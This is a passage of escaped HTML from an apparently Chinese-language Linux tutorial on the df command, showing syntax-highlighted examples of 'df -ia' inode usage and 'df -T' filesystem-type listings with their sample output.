&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970928516692009-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970928516692009-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970928516692009-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970928516692009-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970928516692009-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970928516692009-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970928516692009-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970928516692009-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970928516692009-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970928516692009-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970928516692009-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970928516692009-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970928516692009-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970928516692009-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970928516692009-23&quot;&gt;23&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970928516692009-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;CT1190&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# df -ia&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970928516692009-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970928516692009-3&quot;&gt;文件系统               &lt;span class=&quot;crayon-i&quot;&gt;Inode&lt;/span&gt; &lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;I&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;已用 &lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;I&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;可用 &lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;I&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;已用&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; 挂载点&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970928516692009-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970928516692009-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda7&lt;/span&gt;            &lt;span class=&quot;crayon-cn&quot;&gt;5124480&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;5560&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;5118920&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970928516692009-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970928516692009-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;proc&lt;/span&gt;                       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;    &lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;  &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;proc&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970928516692009-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970928516692009-9&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;sysfs&lt;/span&gt;                      &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;    &lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;  &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sys&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970928516692009-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970928516692009-11&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;devpts&lt;/span&gt;                     &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;    &lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;  &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pts&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970928516692009-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970928516692009-13&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda9&lt;/span&gt;            &lt;span class=&quot;crayon-cn&quot;&gt;52592640&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;50519&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;52542121&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;opt&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970928516692009-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970928516692009-15&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda8&lt;/span&gt;            &lt;span class=&quot;crayon-cn&quot;&gt;1280000&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;8799&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1271201&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970928516692009-16&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970928516692009-17&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda6&lt;/span&gt;            &lt;span class=&quot;crayon-cn&quot;&gt;5124480&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;80163&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;5044317&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;usr&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970928516692009-18&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970928516692009-19&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda3&lt;/span&gt;             &lt;span class=&quot;crayon-cn&quot;&gt;255232&lt;/span&gt;      &lt;span class=&quot;crayon-cn&quot;&gt;34&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;255198&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;boot&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970928516692009-20&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970928516692009-21&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;tmpfs&lt;/span&gt;                &lt;span class=&quot;crayon-cn&quot;&gt;4118303&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;4118302&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;shm&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970928516692009-22&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970928516692009-23&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;none&lt;/span&gt;                       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;    &lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;  &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;fs&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;binfmt_misc&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0048 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;实例5：列出文件系统的类型&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c97092d028617921&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
df -T&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c97092d028617921-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c97092d028617921-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;df&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;T&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0004 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c97092f873287481&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
root@CT1190 log]# df -T

文件系统      类型     1K-块        已用     可用 已用% 挂载点

/dev/sda7     ext3    19840892    890896  17925856   5% /

/dev/sda9     ext3   203727156  93175692 100035720  49% /opt

/dev/sda8     ext3     4956284    570104   4130348  13% /var

/dev/sda6     ext3    19840892   1977568  16839184  11% /usr

/dev/sda3     ext3      988116     23880    913232   3% /boot

tmpfs        tmpfs    16473212         0  16473212   0% /dev/shm&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c97092f873287481-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c97092f873287481-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c97092f873287481-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c97092f873287481-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c97092f873287481-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c97092f873287481-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c97092f873287481-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c97092f873287481-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c97092f873287481-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c97092f873287481-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c97092f873287481-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c97092f873287481-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c97092f873287481-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c97092f873287481-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c97092f873287481-15&quot;&gt;15&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c97092f873287481-1&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;CT1190&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# df -T&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c97092f873287481-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c97092f873287481-3&quot;&gt;文件系统      类型     &lt;span class=&quot;crayon-cn&quot;&gt;1K&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;块        已用     可用 已用&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; 挂载点&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c97092f873287481-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c97092f873287481-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda7&lt;/span&gt;     &lt;span class=&quot;crayon-i&quot;&gt;ext3&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;19840892&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;890896&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;17925856&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c97092f873287481-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c97092f873287481-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda9&lt;/span&gt;     &lt;span class=&quot;crayon-i&quot;&gt;ext3&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;203727156&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;93175692&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;100035720&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;49&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;opt&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c97092f873287481-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c97092f873287481-9&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda8&lt;/span&gt;     &lt;span class=&quot;crayon-i&quot;&gt;ext3&lt;/span&gt;     &lt;span class=&quot;crayon-cn&quot;&gt;4956284&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;570104&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;4130348&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c97092f873287481-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c97092f873287481-11&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda6&lt;/span&gt;     &lt;span class=&quot;crayon-i&quot;&gt;ext3&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;19840892&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;1977568&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;16839184&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;usr&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c97092f873287481-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c97092f873287481-13&quot;&gt;
